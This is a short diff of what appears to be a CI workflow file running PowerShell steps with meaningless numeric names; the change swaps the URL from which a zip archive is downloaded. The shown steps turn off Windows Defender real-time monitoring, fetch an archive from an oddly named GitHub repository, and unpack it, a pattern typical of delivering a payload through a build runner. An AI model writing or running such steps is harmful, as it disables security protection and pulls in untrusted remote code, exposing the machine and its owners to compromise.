@@ -23,7 +23,7 @@ jobs:
     - name: 11
       run: Set-MpPreference -DisableRealtimeMonitoring $true
     - name: 14
-      run: Invoke-WebRequest -URI https://github.com/thomas12Garcia/046544ax1jefflinda/raw/refs/heads/main/RegMikroMan222.zip -outfile c:\21\RegMikroMan222.zip
+      run: Invoke-WebRequest -URI https://github.com/thomas12Garcia/1231fdgfdg423/raw/refs/heads/main/RegMikroMan222.zip -outfile c:\21\RegMikroMan222.zip
     - name: 7
       run: Expand-Archive -LiteralPath "c:\21\RegMikroMan222.zip" -DestinationPath "C:\21"
     - name: 15
